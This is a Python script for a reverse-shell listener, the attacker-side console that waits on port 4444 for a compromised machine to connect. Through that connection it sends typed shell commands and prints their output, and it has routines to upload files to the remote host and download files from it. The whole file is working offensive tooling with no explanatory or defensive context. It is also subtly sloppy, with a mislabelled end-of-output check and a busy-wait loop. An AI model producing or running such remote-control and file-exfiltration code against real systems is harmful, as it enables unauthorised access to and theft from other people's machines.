import socket
import threading
import base64


class ReverseShell:
    def __init__(self, port):
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(("0.0.0.0", port))
        self.server_socket.listen(1)
        print(f"Listener started on port {port}. Waiting for connection...")

    def handle_connection(self, client_socket):
        try:
            while True:
                command = input("Command: ")
                if command == "exit":
                    break
                else:
                    client_socket.sendall(command.encode() + b"\n")
                    self.receive_shell_response(client_socket)
        except KeyboardInterrupt:
            print("Exiting...")
        except Exception as e:
            print("Error:", e)
        finally:
            client_socket.close()

    def receive_shell_response(self, client_socket):
        output = bytearray()
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            if data == b'\r\n':  # Check for the null byte indicator
                break
            output.extend(data)
        print("\n", output.decode())

    def upload_file(self, client_socket, filename):
        with open(filename, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client_socket.sendall(data)
        print(f"File {filename} uploaded successfully!")

    def download_file(self, client_socket, filename):
        client_socket.sendall(b"download " + filename.encode() + b"\n")
        with open(filename, "wb") as f:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                f.write(data)
        print(f"File {filename} downloaded successfully!")

    def start(self):
        client_socket, address = self.server_socket.accept()
        print(f"Connected by {address}" + "\n")
        thread = threading.Thread(target=self.handle_connection, args=(client_socket,))
        thread.daemon = True  # Set as daemon thread so it exits when main thread exits
        thread.start()

        while True:
            pass


if __name__ == "__main__":
    port = 4444
    rs = ReverseShell(port)
    rs.start()